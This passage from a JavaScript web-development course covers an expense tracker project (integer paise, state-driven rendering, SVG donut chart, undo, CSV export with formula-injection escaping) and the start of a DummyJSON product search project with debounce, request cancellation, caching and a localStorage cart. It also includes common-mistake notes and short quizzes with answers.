  4. Rows from a template: #row is a <template>; each render clones it and fills it with textContent. Edit and Delete buttons get an aria-label that includes the title, so a screen reader says “Delete Team lunch”, not just “button”.
  5. Edit mode: clicking ✎ sets state.editId, copies the values into the form and changes the button text. Submit then maps over the array instead of adding.
  6. Undo: a delete keeps the removed expense in a closure: the toast’s Undo handler simply commits it back. The toast lives in a role="status" region, which screen readers announce politely.
  7. Layout: grids use repeat(auto-fit, minmax(280px, 1fr)), so the form and chart sit side by side on a laptop and stack on a phone with no media query.

  background: #0f172a; color: #fff; padding: 10px 16px; border-radius: 12px; transition: translate .25s;
  box-shadow: 0 10px 30px rgb(0 0 0 / .25); max-width: calc(100% - 32px); }
.toast.show { translate: -50% 0; }

JavaScript

const KEY = 'ralfiz-money';
const CATS = {
  food: { label: 'Food', icon: '🍛', color: '#f97316' },
  travel: { label: 'Travel', icon: '🚕', color: '#0ea5e9' },
  bills: { label: 'Bills', icon: '💡', color: '#8b5cf6' },
  shopping: { label: 'Shopping', icon: '🛍️', color: '#ec4899' },
  health: { label: 'Health', icon: '💊', color: '#10b981' },
};
const SEED = [
  { id: 1, title: 'Office rent share', amount: 1200000, cat: 'bills', date: '2026-09-01' },
  { id: 2, title: 'Team lunch', amount: 185000, cat: 'food', date: '2026-09-12' },
  { id: 3, title: 'Cab to Kochi airport', amount: 142050, cat: 'travel', date: '2026-09-18' },
  { id: 4, title: 'Laptop bag', amount: 249900, cat: 'shopping', date: '2026-09-21' },
  { id: 6, title: 'Groceries', amount: 312075, cat: 'food', date: '2026-08-28' },
];
const inr = new Intl.NumberFormat('en-IN', { style: 'currency', currency: 'INR' });
const money = (paise) => inr.format(paise / 100);
const monthFmt = new Intl.DateTimeFormat('en-IN', { month: 'long', year: 'numeric', timeZone: 'UTC' });
const dayFmt = new Intl.DateTimeFormat('en-IN', { day: 'numeric', month: 'short', timeZone: 'UTC' });
const $ = (sel) => document.querySelector(sel);
const el = (tag, className, text = '') => Object.assign(document.createElement(tag), { className, textContent: text });
const NS = 'http://www.w3.org/2000/svg';
const form = $('#form');
const state = { expenses: load(), month: 'all', editId: null };
function load() {
  try { return JSON.parse(localStorage.getItem(KEY)) ?? SEED; } catch { return SEED; } // bad JSON
}
function commit(expenses) {                       // update → save → render
  state.expenses = expenses;
  localStorage.setItem(KEY, JSON.stringify(expenses));
  render();
}
const visible = () => state.expenses
  .filter((e) => state.month === 'all' || e.date.startsWith(state.month))
  .toSorted((a, b) => b.date.localeCompare(a.date) || b.id - a.id);
function render() {
  renderMonths();
  const list = visible();
  const total = list.reduce((sum, e) => sum + e.amount, 0);
  const sums = Object.entries(Object.groupBy(list, (e) => e.cat))
    .map(([cat, items]) => ({ cat, sum: items.reduce((s, e) => s + e.amount, 0) }))
    .toSorted((a, b) => b.sum - a.sum);
  $('#total').textContent = money(total);
  $('#count').textContent = list.length;
  $('#top').textContent = sums[0] ? CATS[sums[0].cat].label : '—';
  renderList(list);
  renderChart(sums, total);
}
function renderMonths() {
  const months = [...new Set(state.expenses.map((e) => e.date.slice(0, 7)))].sort().reverse();
  if (!months.includes(state.month)) state.month = 'all';
  $('#month').replaceChildren(new Option('All months', 'all'),
    ...months.map((m) => new Option(monthFmt.format(new Date(m + '-01')), m)));
  $('#month').value = state.month;
}
function renderList(list) {
  $('#list').replaceChildren(...list.map((e) => {
    const row = $('#row').content.firstElementChild.cloneNode(true);
    const cat = CATS[e.cat];
    row.dataset.id = e.id;
    row.classList.toggle('editing', e.id === state.editId);
    row.querySelector('.ico').textContent = cat.icon;
    row.querySelector('.ico').style.background = cat.color + '22';
    row.querySelector('.t').textContent = e.title;
    row.querySelector('.m').textContent = `${cat.label} · ${dayFmt.format(new Date(e.date))}`;
    row.querySelector('.amt').textContent = money(e.amount);
    row.querySelector('[data-act=edit]').setAttribute('aria-label', `Edit ${e.title}`);
    row.querySelector('[data-act=del]').setAttribute('aria-label', `Delete ${e.title}`);
    return row;
  }));
  $('#empty').hidden = list.length > 0;
}
function renderChart(sums, total) {
  $('#donut').querySelectorAll('.seg').forEach((n) => n.remove());
  const gap = sums.length > 1 ? 0.8 : 0;
  let offset = 25;
  for (const { cat, sum } of sums) {
    const pct = (sum / total) * 100;
    const seg = document.createElementNS(NS, 'circle');
    const attrs = { class: 'seg', cx: 21, cy: 21, r: 15.915, stroke: CATS[cat].color,
      'stroke-dasharray': `${pct - gap} ${100 - pct + gap}`, 'stroke-dashoffset': offset };
    for (const [k, v] of Object.entries(attrs)) seg.setAttribute(k, v);
    $('#donut').append(seg);
    offset -= pct;
  }
  $('#center').textContent = money(total);
  $('#legend').replaceChildren(...sums.map(({ cat, sum }) => {
    const li = el('li', '');
    li.style.setProperty('--c', CATS[cat].color);
    li.append(el('span', 'dot'), CATS[cat].label, el('span', 'val', money(sum)), el('b', '', `${Math.round((sum / total) * 100)}%`));
    return li;
  }));
}
function resetForm() {
  state.editId = null;
  form.reset();
  form.elements.date.value = new Date().toLocaleDateString('en-CA');   // local YYYY-MM-DD
  $('#formTitle').textContent = $('#save').textContent = 'Add expense';
  $('#cancel').hidden = true;
}
form.addEventListener('submit', (ev) => {
  ev.preventDefault();
  const data = Object.fromEntries(new FormData(form));
  const entry = { title: data.title.trim(), amount: Math.round(Number(data.amount) * 100), cat: data.cat, date: data.date };
  if (!entry.title || !(entry.amount > 0)) return;
  const next = state.editId
    ? state.expenses.map((e) => (e.id === state.editId ? { ...e, ...entry } : e))
    : [...state.expenses, { id: Date.now(), ...entry }];
  toast(state.editId ? 'Expense updated' : `Added ${entry.title}`);
  resetForm();
  commit(next);
});
$('#list').addEventListener('click', (ev) => {
  const btn = ev.target.closest('button[data-act]');
  if (!btn) return;
  const id = Number(btn.closest('.row').dataset.id);
  const item = state.expenses.find((e) => e.id === id);
  if (btn.dataset.act === 'del') {
    if (state.editId === id) resetForm();
    commit(state.expenses.filter((e) => e.id !== id));
    const undo = () => { commit([...state.expenses, item]); toast('Expense restored'); };
    return toast(`Deleted ${item.title}`, undo);
  }
  const f = form.elements;
  state.editId = id;
  f.title.value = item.title;
  f.amount.value = (item.amount / 100).toFixed(2);
  [f.cat.value, f.date.value] = [item.cat, item.date];
  $('#formTitle').textContent = 'Edit expense';
  $('#save').textContent = 'Save changes';
  $('#cancel').hidden = false;
  f.title.focus();
  render();
});
let toastTimer;
function toast(message, onUndo) {
  const box = $('#toast');
  box.replaceChildren(message);
  if (onUndo) box.append(Object.assign(el('button', '', 'Undo'), { onclick: onUndo }));
  box.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => box.classList.remove('show'), 4000);
}
const csvCell = (value) => {
  let s = String(value);
  if (/^[=+\-@]/.test(s)) s = "'" + s;
  return /[",\r\n]/.test(s) ? `"${s.replaceAll('"', '""')}"` : s;
};
function exportCsv() {
  const rows = [['Date', 'Title', 'Category', 'Amount (INR)'],
    ...visible().map((e) => [e.date, e.title, CATS[e.cat].label, (e.amount / 100).toFixed(2)])];
  const blob = new Blob(['﻿' + rows.map((r) => r.map(csvCell).join(',')).join('\r\n')], { type: 'text/csv;charset=utf-8' });
  const link = Object.assign(el('a', ''),
    { href: URL.createObjectURL(blob), download: `ralfiz-expenses-${state.month}.csv` });
  link.click();
  setTimeout(() => URL.revokeObjectURL(link.href), 1000);
  console.log(`Exported ${rows.length - 1} rows (${blob.size} bytes) as ${link.download}`);
}
$('#month').addEventListener('change', (ev) => { state.month = ev.target.value; render(); });
$('#cancel').addEventListener('click', () => { resetForm(); render(); });
$('#export').addEventListener('click', exportCsv);
form.elements.cat.replaceChildren(...Object.entries(CATS).map(([k, c]) => new Option(`${c.icon} ${c.label}`, k)));
resetForm();
render();
console.log(`Loaded ${state.expenses.length} expenses`);

Add, edit (✎), delete with Undo, switch months and export. Rerun the page: your data is still there. Try the phone-width toggle.

Try it: edit “Laptop bag” to ₹1,999, switch to August, delete an expense and press Undo, then press Run again to prove that localStorage kept your changes.

Common mistakes

1. Storing rupees as decimals.

// Wrong: 0.1 + 0.2 style drift in totals
const total = items.reduce((s, e) => s + e.rupees, 0);
// Right: integer paise, format at the end
const total = items.reduce((s, e) => s + e.amount, 0);
money(total); // inr.format(total / 100)

2. Today’s date from toISOString(). It returns the UTC date, so in India before 5:30 a.m. you get yesterday.

// Wrong
input.value = new Date().toISOString().slice(0, 10);
// Right: the local date in YYYY-MM-DD form
input.value = new Date().toLocaleDateString('en-CA');

3. Control names that clash with form properties. Forms expose named controls as properties, and a named control wins over the form’s own property. An input called title, action or submit hides form.title, form.action or form.submit(), which breaks any code that expected the real property.

form.action;               // Surprise: the <input name="action">, not the form’s URL
form.submit();             // TypeError if an input is named submit
form.elements.title.value; // Clear: form.elements always means the controls

4. Updating the DOM in the handler as well as in render. If the delete handler removes the row and forgets the totals, the page lies. Change state only; let render() draw.

5. Forgetting to revoke object URLs. Each createObjectURL keeps the Blob in memory until the page closes. Revoke it after the download starts.

Interview and real-world notes

  • “How do you handle money in JavaScript?” Integers in the smallest unit (or a decimal library on the server), format with Intl.NumberFormat, and let the server be the final authority for invoices.
  • Full re-rendering is fine for a few hundred rows. Past a few thousand, use keyed updates or virtualisation (dm18), or a framework (dm24).
  • localStorage is per origin, synchronous and small (a few megabytes). For years of data, move to IndexedDB (dm12) or a backend; the commit() function is the one place you would change.
  • For a portfolio, add a README with screenshots, a short “decisions” section (paise, date strings, CSV escaping) and a live link. Reviewers read decisions more closely than code.

Predict the output

Read each snippet and decide what it prints before you run it. The answers are at the end of this section.

Snippet 1. What is logged?

const inr = new Intl.NumberFormat('en-IN', { style: 'currency', currency: 'INR' });
console.log(inr.format(1234567.5));
  • A ₹1,234,567.50
  • B ₹12,34,567.5
  • C ₹12,34,567.50
  • D INR 12,34,567.50

Snippet 2. What is logged?

const rupees = [0.1, 0.2, 0.3];
const paise = [10, 20, 30];
console.log(rupees.reduce((s, x) => s + x, 0));
console.log(paise.reduce((s, x) => s + x, 0) / 100);
  • A 
    0.6
0.6
  • B 
    0.6000000000000001
0.6
  • C 
    0.6000000000000001
0.6000000000000001
  • D 
    0.6
0.6000000000000001

Snippet 3. What is logged?

const expenses = [
  { date: '2026-09-02', amount: 500 },
  { date: '2026-08-30', amount: 700 },
  { date: '2026-09-15', amount: 300 },
];
const byMonth = Object.groupBy(expenses, (e) => e.date.slice(0, 7));
console.log(Object.keys(byMonth), byMonth['2026-09'].length);
  • A [ '2026-08', '2026-09' ] 2
  • B [ '2026-09', '2026-08' ] 3
  • C [ '2026-09' ] 2
  • D [ '2026-09', '2026-08' ] 2

Answers

  1. C. The en-IN locale groups digits the Indian way (lakhs and crores: 12,34,567), and the INR currency style always shows two decimal places.
  2. B. 0.1, 0.2 and 0.3 have no exact binary representation, so the decimal sum drifts. The integer sum 60 is exact, and 60 / 100 prints as 0.6.
  3. D. Object.groupBy creates keys in the order it first meets them (September first), and September has two expenses. It does not sort the keys for you.

terms.definition: Storing money as whole numbers of the smallest unit (₹12.50 = 1250 paise) so that sums never suffer floating-point errors.
One state object holds the data; the page is always drawn from it, never read back from the DOM.
Values you calculate from state when you render (totals, month list, category sums) instead of storing them.
The built-in formatter for numbers and currencies; en-IN with INR gives Indian digit grouping like ₹12,34,567.50.
An SVG attribute that draws a stroke as dashes and gaps; on a circle with circumference 100 it turns percentages into donut segments.
An immutable chunk of raw data with a MIME type; URL.createObjectURL(blob) gives a temporary URL you can download.
A spreadsheet treats a cell starting with =, +, - or @ as a formula; exporters neutralise such cells.

lessons.examTip: In a portfolio review, explain why you store amounts in paise and dates as YYYY-MM-DD strings: it shows you understand floating point and time zones, two classic production bugs.

quiz.question: Why does the tracker store ₹1,850.00 as 185000?
options: Integers in paise add up exactly, while decimal rupees can pick up floating-point errors
localStorage can only store integers
Intl.NumberFormat only accepts integers
It makes the JSON smaller than any other format
quiz.explanation: Binary floating point cannot represent values like 0.1 exactly, so sums drift. Whole paise are exact; divide by 100 only when formatting.

quiz.question: The month filter changes. What should the handler do?
options: Loop over the list items and hide the ones from other months
Set state.month and call render(), which derives the visible list from state
Call location.reload() so the page starts fresh
Remove the other months from state.expenses
quiz.explanation: The DOM is drawn from state. Changing state and re-rendering keeps totals, chart and list consistent; hiding rows by hand leaves the totals wrong.

quiz.question: On an SVG circle with r = 15.915, why does stroke-dasharray="40 60" draw a 40% segment?
options: SVG always measures dashes in percent
The viewBox is 100 units wide
The circumference is 2πr ≈ 100, so dash lengths read as percentages of the ring
stroke-dasharray ignores the radius
quiz.explanation: 2 × π × 15.915 ≈ 100. Choosing that radius lets you use percentages directly as dash lengths.

quiz.question: Which export is safe to open in a spreadsheet?
options: Joining the raw values with commas
Putting every value inside single quotes
Using innerHTML to build the file
Quoting cells that contain commas, quotes or line breaks, doubling inner quotes and neutralising cells that start with = + - or @
quiz.explanation: RFC 4180 style quoting keeps columns intact, and prefixing formula-like cells stops CSV (formula) injection.

lessons.title: Project: Ralfiz Store product search
lessons.summaryHtml:
In this project you build the Ralfiz Store product browser against the real DummyJSON API. It has search with debounce, where stale requests are cancelled with AbortController. It also has category chips, sorting, pagination, a product detail <dialog> and a cart saved in localStorage.

The filters live in the URL, so a search can be bookmarked, shared or reached again with the Back button. Every request has four honest UI states: loading (skeleton cards), error (with Retry), empty (with a way out) and success. A polite live region announces results to screen-reader users.

You build it in stages: state and URLs, then the fetch pipeline, then the cart store, then the finished app.
lessons.contentHtml:
In plain words

Almost every web product has a screen like this one: a search box, some filters, a grid of results and a detail view. You will build it for Ralfiz Store against the real DummyJSON products API. Your app will search as you type, filter by category, sort, page through results, open a product in a dialog and keep a cart that survives a reload.

The interesting part is not drawing cards. It is handling what the network actually does. Responses arrive late, arrive out of order, fail, or come back empty. A junior developer who handles all four cases calmly is worth a lot to a team.

Why it matters

Search pages are where users decide to buy, so small bugs cost money. Typical bugs are these. Results for “ph” flash over results for “phone”. The page shows an eternal spinner when the Wi-Fi drops. A shared link opens the wrong filters. A screen reader user never hears that the results changed. Each has a standard fix, and this project applies all of them.

ProblemFix in this project
A request on every key pressDebounce the input (300 ms)
Old responses overwrite new onesAbortController cancels the previous request
Same page fetched again and againA Map cache keyed by request URL
Links and Back button lose the filtersState lives in the URL
Blank screen while loading or after an errorSkeleton, error, empty and success states
Changes are silent for screen readersA role="status" live region

How it works

The architecture is the same loop as the expense tracker, with one extra step. A control changes → update(patch) merges the patch into state → writes the URL → syncs the controls → calls load(). load() turns state into an API URL, fetches it and calls render(data). Nothing else fetches or renders the grid.

Stage 1: one state, two URLs

The state is just { q, cat, sort, page }. From it you derive two URLs. The address bar URL is for humans: it keeps only non-default values, so the first page of everything is simply the bare address. The API URL is for DummyJSON, which has three different endpoints: /products, /products/search?q= and /products/category/{slug}. All three accept limit, skip, select, sortBy and order.

Try it: Stage 1: state ⇄ URL ⇄ API

JavaScript

const API = 'https://dummyjson.com';
const PAGE = 12;

// state → address bar (only non-default values)
function toQuery(state) {
  const entries = Object.entries(state)
    .filter(([key, value]) => value && !(key === 'page' && value === 1));
  return new URLSearchParams(entries).toString();
}

// address bar → state (with defaults and type conversion)
function fromQuery(query) {
  const p = new URLSearchParams(query);
  return { q: p.get('q') ?? '', cat: p.get('cat') ?? '', sort: p.get('sort') ?? '',
    page: Math.max(1, Number(p.get('page')) || 1) };
}

// state → API request
function apiUrl({ q, cat, sort, page }) {
  const p = new URLSearchParams({ limit: PAGE, skip: (page - 1) * PAGE });
  if (q) p.set('q', q);
  if (sort) {
    const [by, order] = sort.split('-');
    p.set('sortBy', by);
    p.set('order', order);
  }
  const path = q ? 'products/search'
    : cat ? `products/category/${encodeURIComponent(cat)}` : 'products';
  return `${API}/${path}?${p}`;
}

const state = { q: 'red lipstick', cat: '', sort: 'price-asc', page: 2 };
console.log('Address bar: ?' + toQuery(state));
console.log('API:', apiUrl(state));
console.log('Round trip:', fromQuery(toQuery(state)));
console.log('Defaults:', fromQuery('page=abc'));
console.log('Category:', apiUrl({ q: '', cat: 'home-decoration', sort: '', page: 1 }));

One state object produces two URLs: the one in the address bar and the one sent to DummyJSON. Change the state and run again.

Notice two defensive details. fromQuery converts page to a number and falls back to 1 for rubbish like page=abc: the URL is user input. And the category slug goes through encodeURIComponent because it becomes part of a path, where URLSearchParams does not help you.

Real-world constraint: DummyJSON’s search endpoint cannot also filter by category. Rather than fake it on one page of results (which breaks pagination), the app treats them as two modes: typing a search clears the category, and picking a chip clears the search. Designing around an API’s limits honestly is a normal part of front-end work.

Stage 2: debounce, abort and the four states

Debounce means “run only after the user has paused”. Each key press clears the previous timer and starts a new one, so typing “phone” quickly sends one request, not five. Abort solves the other half. Even with debounce, a slow request for “ph” can still be in flight when “phone” starts. Keeping the last AbortController and calling abort() before each new fetch cancels it. The old fetch promise then rejects with an AbortError, which you ignore on purpose.

let controller;
async function load() {
  controller?.abort();                    // cancel the previous request
  controller = new AbortController();
  try {
    const res = await fetch(url, { signal: controller.signal });
    if (!res.ok) throw new Error(`The server answered ${res.status}`);
    render(await res.json());
  } catch (err) {
    if (err.name === 'AbortError') return; // expected, not a failure
    showError(err);
  }
}

Remember that fetch only rejects on network failure. A 404 or 500 still resolves, which is why the !res.ok check turns it into an error yourself. Then design all four states: loading shows skeleton cards the same size as real cards, so nothing jumps when data arrives. Error explains what happened and offers Retry. Empty says what was searched and offers a way out. Success shows the grid and a summary line.

const API = 'https://dummyjson.com';
const input = document.querySelector('#q');
const status = document.querySelector('#status');
const results = document.querySelector('#results');
const usd = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' });
const cache = new Map();
let controller;

function debounce(fn, ms) {
  let timer;
  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), ms);
  };
}

function showState(icon, text, action) {
  const li = document.createElement('li');
  li.className = 'state';
  li.append(Object.assign(document.createElement('span'), { textContent: icon }), text);
  if (action) {
    const btn = Object.assign(document.createElement('button'), { type: 'button', textContent: 'Retry' });
    btn.addEventListener('click', action);
    li.append(document.createElement('br'), btn);
  }
  results.replaceChildren(li);
}

async function search(q) {
  controller?.abort();                               // cancel the stale request
  controller = new AbortController();
  const path = document.querySelector('#broken').checked ? 'productz/search' : 'products/search';
  const url = `${API}/${path}?${new URLSearchParams({ q, limit: 6, select: 'title,price' })}`;
  status.textContent = 'Searching…';                  // LOADING
  results.replaceChildren(...Array.from({ length: 3 }, () =>
    Object.assign(document.createElement('li'), { innerHTML: '<div class="skel" style="width:100%"></div>' })));
  try {
    let data = cache.get(url);
    if (data) console.log('cache hit:', q);
    else {
      console.log('fetch:', q);
      const res = await fetch(url, { signal: controller.signal });
      if (!res.ok) throw new Error(`Server answered ${res.status}`);
      data = await res.json();
      cache.set(url, data);
    }
    if (data.products.length === 0) {                // EMPTY
      status.textContent = 'No results';
      return showState('🔎', `Nothing matches “${q}”. Try another word.`);
    }
    status.textContent = `${data.total} results for “${q}”`;   // SUCCESS
    results.replaceChildren(...data.products.map((p) => {
      const li = document.createElement('li');
      li.append(p.title, Object.assign(document.createElement('b'), { textContent: usd.format(p.price) }));
      return li;
    }));
  } catch (err) {
    if (err.name === 'AbortError') return console.log('aborted:', q);
    status.textContent = 'Something went wrong';     // ERROR
    showState('⚠️', `${err.message}. `, () => search(q));
  }
}

const debouncedSearch = debounce(search, 300);
input.addEventListener('input', () => debouncedSearch(input.value.trim() || 'phone'));
search('phone');

Type fast and watch the console: only the last query is fetched. Tick “Break the API” to see the error state, then search for “zzz” for the empty state.

The cache is a Map from the full request URL to the parsed data. Going back to page 1, or retyping a query, is instant and costs no request. For a product catalogue this is safe for the life of the page; data that changes often needs an expiry time.

Instead of each piece reading localStorage itself, you wrap the data in a small store: private data, a few methods that change it, and subscribe(fn) so the UI hears about every change. The store saves to localStorage inside notify(), so no feature can forget to save.

const PRODUCTS = [
  { id: 1, title: 'Ralfiz Desk Lamp', price: 24.99, emoji: '💡' },
  { id: 2, title: 'Canvas Backpack', price: 39.5, emoji: '🎒' },
  { id: 3, title: 'Ceramic Mug', price: 8.75, emoji: '☕' },
];
const usd = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' });

// A tiny store: private data, public methods, and subscribers
function createCart(key) {
  let lines = JSON.parse(localStorage.getItem(key) ?? '{}');
  const listeners = new Set();
  const notify = () => {
    localStorage.setItem(key, JSON.stringify(lines));
    listeners.forEach((fn) => fn(cart.snapshot()));
  };
  const cart = {
    add(p) {
      const line = lines[p.id] ?? { id: p.id, title: p.title, cents: Math.round(p.price * 100), qty: 0 };
      lines = { ...lines, [p.id]: { ...line, qty: line.qty + 1 } };
      notify();
    },
    change(id, delta) {
      const qty = (lines[id]?.qty ?? 0) + delta;
      const { [id]: _removed, ...rest } = lines;
      lines = qty > 0 ? { ...rest, [id]: { ...lines[id], qty } } : rest;
      notify();
    },
    snapshot() {
      const items = Object.values(lines);
      return { items, count: items.reduce((n, l) => n + l.qty, 0),
        cents: items.reduce((n, l) => n + l.cents * l.qty, 0) };
    },
    subscribe(fn) { listeners.add(fn); fn(cart.snapshot()); return () => listeners.delete(fn); },
  };
  return cart;
}

const cart = createCart('ralfiz-cart-demo');

document.querySelector('#products').replaceChildren(...PRODUCTS.map((p) => {
  const card = document.createElement('article');
  card.className = 'item';
  card.innerHTML = '<span class="emo" aria-hidden="true"></span><div><strong></strong><small></small></div><button class="add" type="button">Add</button>';
  card.querySelector('.emo').textContent = p.emoji;
  card.querySelector('strong').textContent = p.title;
  card.querySelector('small').textContent = usd.format(p.price);
  card.querySelector('.add').addEventListener('click', () => cart.add(p));
  return card;
}));

cart.subscribe(({ items, count, cents }) => {
  document.querySelector('#count').textContent = count;
  document.querySelector('#total').textContent = usd.format(cents / 100);
  const lines = document.querySelector('#lines');
  if (!items.length) return lines.replaceChildren(Object.assign(document.createElement('li'), { className: 'empty', textContent: 'Your cart is empty.' }));
  lines.replaceChildren(...items.map((l) => {
    const li = document.createElement('li');
    li.dataset.id = l.id;
    li.innerHTML = '<span class="name"></span><span class="qty"><button type="button" data-d="-1">−</button><output></output><button type="button" data-d="1">+</button></span>';
    li.querySelector('.name').textContent = l.title;
    li.querySelector('output').textContent = l.qty;
    li.querySelector('[data-d="-1"]').setAttribute('aria-label', `Remove one ${l.title}`);
    li.querySelector('[data-d="1"]').setAttribute('aria-label', `Add one ${l.title}`);
    return li;
  }));
});
cart.subscribe(({ count }) => console.log('cart changed:', count, 'items'));

document.querySelector('#lines').addEventListener('click', (ev) => {
  const btn = ev.target.closest('button[data-d]');

Add items and change quantities, then press Run: the cart is restored from localStorage. The UI only ever reacts to the store’s notify().

Prices are kept as whole cents inside the cart for the same reason you kept paise in dm21. The finished app uses a lighter version of this idea (addToCart and saveCart) to stay short, but the rule is identical: change the data, then one function saves and redraws.

Stage 4: URL sync and history

writeUrl() uses history.replaceState while typing (so Back does not step through every letter) and pushState for deliberate navigation such as a new category or page. A popstate listener reads the URL back into state and reloads, so the browser’s Back and Forward buttons move through filters. The playground only allows hash URLs, so the play writes #?q=phone&page=2. The lab files use the real query string (?q=phone&page=2) because a dev server can serve them.

function writeUrl(push) {
  const p = new URLSearchParams(
    Object.entries(state).filter(([k, v]) => v && !(k === 'page' && v === 1)));
  const url = p.size ? `?${p}` : location.pathname;
  history[push ? 'pushState' : 'replaceState'](null, '', url);
}
addEventListener('popstate', () => {
  Object.assign(state, readUrl());
  syncControls();
  load();
});

Example: the finished Ralfiz Store

Read the final code top to bottom; each block matches a stage.

  1. State and URLs: readUrl, writeUrl and apiUrl. The initial state comes from the URL, so a shared link opens the same view.
  2. load(): abort, skeletons, cache, fetch, response.ok, then render or the error message with Retry.
  3. render(): cards from a <template> filled with textContent (product data is untrusted, even from a friendly API), the empty state, the status line and the pager.
  4. Images: each card shows a category emoji on a colour tile, and the product photo is laid over it as a background image. If the photo cannot load, the tile still looks intentional. In the lab you use a real <img> with alt, width, height and loading="lazy".
  5. update(): the single path for every control: search (debounced), chips, sort, Prev and Next.
  6. Detail dialog: showModal() makes the rest of the page inert and returns focus to the clicked title on close; clicking the backdrop closes it too. The play asks for description in select, so it can open the dialog from data it already has. The lab version fetches /products/{id} for the full record and adds a cart dialog with remove buttons.
  7. Cart: addToCart and saveCart are the store idea from Stage 3 in a few lines. The header pill shows the item count and the total in cents-exact dollars.
  8. Accessibility: chips use aria-pressed, add buttons have labels like “Add Red Lipstick to cart”, the status line is a live region, and a hidden live region announces cart additions.
